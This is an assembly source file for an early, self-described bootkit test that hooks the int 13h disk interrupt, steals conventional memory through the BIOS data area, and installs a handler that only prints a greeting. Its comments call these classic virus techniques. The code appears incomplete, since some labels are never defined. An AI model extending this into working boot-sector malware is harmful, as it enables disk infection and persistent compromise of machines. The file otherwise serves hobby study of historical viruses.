;******************************************************************************
;	This is the initial version of the int 13h TSR for 
; 	the Michelangelo REanimator bootkit
;	
;	Use at your own risk. 
;	*Plz dont dd your primary hd partition with this. 
;	This is a functional boot sector that will hang once it hits the 
;	last function
;	It was written as a way to test the graphics functionality of my
;	Michelangelo REanimator project
;	There is no functionality in this boot sector to jump to a loaded
; 	valid MBR, or to a valid boot sector
;		
;	To assemble (with nasm):
;	nasm -f bin -o michelange_grafx_routines.mbr michelange_grafx_routines.mbr
;	
;	To run;
;	qemu-system-i386 -m 16 -rtc base=localtime -device cirrus-vga -display gtk -hda dos_rip.img 
;	Note: the -rtc -device and -display flag values are all based on what 
;   I've used on my own machine as configurations that work well for my use cases.  
;   You may need to adjust them as needed for your own host machine and 
;   what you have installed.
;	To run in a debug session with GDB attached:
;	qemu-system-i386 -m 16 -rtc base=localtime -device cirrus-vga -display gtk -hda dos_rip.img -s -S
;	(see debugging notes for details on setup of GDBi/Bochs session) 
;
;
;******************************************************************************

;.CODE:
;org 0x7C00

;******************************************************************************
SCREEN_MAX			equ 320*100
VGA_PAL_INDEX		equ	0x3C8
VGA_PAL_DATA		equ	0x3C9
;******************************************************************************

old_INT:
db	0EAh			;from Spanska Elvira, EAh is far call
_ORIG_INT	dd	? 	;this is also such a nice trick bc it avoids having to define these in a data segment
iret				;so there is no need to change the segment for loading cs w the correct value


tsr_hook_int:
	cmp	ah, 0x2
	jne 	NO_INT
	pushf

NEW_INT:
	push 	ax
	push 	bx
	push	dx
	push	ds
	push	es
	push	si
	push	di
	
	;;do things here for new ISR xoxo
	cli
	vga_init:
		mov	ax, 0013h
		int	10h
		mov	ax,0xA000
		mov	es,ax
		mov	ds,ax
		mov	di,0
		mov	ax,0202h
		cld
		int13_message:
			rsvp:
				mov cx, int13greetz_len
				mov si, int13greetz
			message:
				push cs
				pop ds
			welcome:
				mov al, ds:[si]
				mov bh, 0x0
				mov bl, 0x0a
				mov ah, 0x0E
				int 0x10
				inc si
				dec cx
				jnz welcome

	cmp cx, 0x1
	jne $+3
	mov cx, 0x3
	sti
	pop di
	pop	si
	pop	es
	pop	ds
	pop	dx
	pop	bx
	pop	ax
	popf

NO_INT:
	push	ax
	mov	al, 0x20
	out	0x20, al
	pop	ax
	jmp 	old_INT




copy_OG_MBR:
	xor ax, ax
	mov es, ax				;classic bootkit technique for stealing mem
	mov ax, es:[0x413] 		;BPB internal memory block count
	dec ax					; steal 2k for virus
	dec ax					; tbd on size adjustments for now
	mov  es:[0x413], ax		;store new altered num freee blocks back in BPB param
	mov cl, 6				;again I don't know why the convention is to mov cl, 6
	shl ax, cl				; and then shift ax by cl
	mov es, ax				; rather than shl ax, 6
	mov [highmem_segment], es	; but whatever, following classic bootkit convention for the mo
	
	push cs
	pop es
	mov di, 0x7C00				;this is typical MBR behavior
	mov bx, 0x200
	mov byte [copy_replay], 0x0
	mov cx, 0x100
	jmp copy_sector_loop	

idontplaytagb:
	jmp 	setup_hook_interrupts

setup_hook_interrupts:
	push es	
	mov	ax,0
	mov	es, ax
	es 	les bx,[0x4C]			;;for int 13h
						;;es:bx contains contents of address 0x4C (0000:004C)
	mov	[_ORIG_INT], bx
	mov	[_ORIG_INT+2], es
	mov es, [highmem_segment]
	mov dx, tsr_hook_int
	mov [0x4C], dx
	mov [0x4E], es
	pop es

	jmp boot2nd:0


DefaultDisk:
	db 0x80

boot2nd equ 0x900
cryptlen equ $-crypt

copy_replay:
	db 0x2

highmem_segment:
	db 0x0

int13greetz:
	db "hello from ur new int13 handler", 0Dh, 0Ah
	db "xoxo", 0Dh, 0Ah
	db "ic3qu33n", 0Dh, 0Ah
int13greetz_len	equ $-int13greetz

